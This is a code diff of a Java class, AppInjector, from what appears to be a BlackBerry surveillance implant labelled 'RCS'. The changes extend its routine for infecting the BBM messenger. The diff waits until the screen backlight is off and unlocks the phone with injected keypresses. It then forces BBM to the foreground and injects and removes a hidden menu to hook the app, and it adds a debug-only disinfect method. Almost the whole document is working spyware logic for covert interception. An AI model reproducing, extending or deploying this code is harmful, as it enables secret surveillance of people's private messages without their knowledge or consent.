@@ -6,12 +6,13 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.injection;
 
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.ApplicationManager;
 import net.rim.device.api.system.Backlight;
+import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
 import blackberry.agent.im.AppInjectorBBM;
@@ -31,6 +32,7 @@ public class AppInjector {
     private AppInjectorInterface delegate;
 
     ApplicationManager manager = ApplicationManager.getApplicationManager();
+    public static final int KEY_LOCK = 4099;
 
     public AppInjector(int app) throws Exception {
         if (app == APP_BBM) {
@@ -68,7 +70,9 @@ public class AppInjector {
                 //#endif
 
                 if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
+                    //MemoryCleanerDaemon.cleanAll();
                     delegate.callMenuByKey();
+                    break;
                 }
             }
         }
@@ -102,35 +106,92 @@ public class AppInjector {
         }
     }
 
-    public void infect() {
+    public synchronized void infect() {
         //#ifdef DEBUG
         debug.trace("infect");
         //#endif
-        
-        Utils.sleep(delegate.getDelay());
-        if(Backlight.isEnabled()  || isInfected()){
+
+        if (Backlight.isEnabled() || isInfected()) {
             //#ifdef DEBUG
             debug.trace("infected or backlight, bailing out");
             //#endif
             return;
         }
-        
+
+        Utils.sleep(delegate.getDelay());
+
+        if (isInfected()) {
+            //#ifdef DEBUG
+            debug.trace("infected, bailing out");
+            //#endif
+            return;
+        }
+
+        Backlight.enable(false);
+
+        unLock();
+
+        if (Backlight.isEnabled()) {
+            //#ifdef DEBUG
+            debug.trace("infected: fail");
+            //#endif
+            return;
+        }
+
         int req = requestForeground();
+
         Utils.sleep(200);
         boolean fore = checkForeground();
 
         if (fore) {
-            Utils.sleep(200);
-            delegate.injectMenu();
-            Utils.sleep(200);
-            callMenuByKey();
-            Utils.sleep(200);
+            try {
+                Utils.sleep(200);
+                delegate.injectMenu();
+                Utils.sleep(200);
+                callMenuByKey();
+                Utils.sleep(200);
+            } catch (Exception ex) {
+                //#ifdef DEBUG
+                debug.error("infect: " + ex);
+                //#endif
+            }
             delegate.deleteMenu();
             Utils.sleep(200);
-            
+
             if (req == 2 && checkForeground()) {
-               manager.requestForegroundForConsole();
+                manager.requestForegroundForConsole();
             }
+        }
+    }
+
+    private void unLock() {
+        manager.requestForegroundForConsole();
+        Utils.sleep(200);
+        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
+        //KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
+        //Utils.sleep(200);
+        //KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
+        Utils.sleep(200);
+        if (Backlight.isEnabled()) {
+            //#ifdef DEBUG
+            debug.trace("Backlight still enabled, getHardwareLayout: "
+                    + Keypad.getHardwareLayout());
+            //#endif
+
+            KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
+            KeyInjector.pressRawKeyCode(KEY_LOCK);
+            Backlight.enable(false);
+            Utils.sleep(500);
+            for (int i = 0; i < 20; i++) {
+                if (Backlight.isEnabled()) {
+                    //Backlight.enable(false);
+                    Utils.sleep(500);
+                }else{
+                    break;
+                }
+            }
+
+            return;
         }
     }
 
@@ -142,7 +203,8 @@ public class AppInjector {
                 int processId = manager.getProcessId(apps[i]);
 
                 if (foregroundPin == processId) {
-                    Screen screen = UiApplication.getUiApplication().getActiveScreen();
+                    Screen screen = UiApplication.getUiApplication()
+                            .getActiveScreen();
                     //#ifdef DEBUG
                     debug.trace("checkForeground, acrive screen: " + screen);
                     //#endif
@@ -180,8 +242,14 @@ public class AppInjector {
         return 0;
     }
 
-    public void reset(){
+    public void reset() {
         delegate.reset();
     }
+
+    //#ifdef DEBUG
+    public void disinfect() {
+        delegate.setInfected(false);
+    }
+    //#endif
 
 }
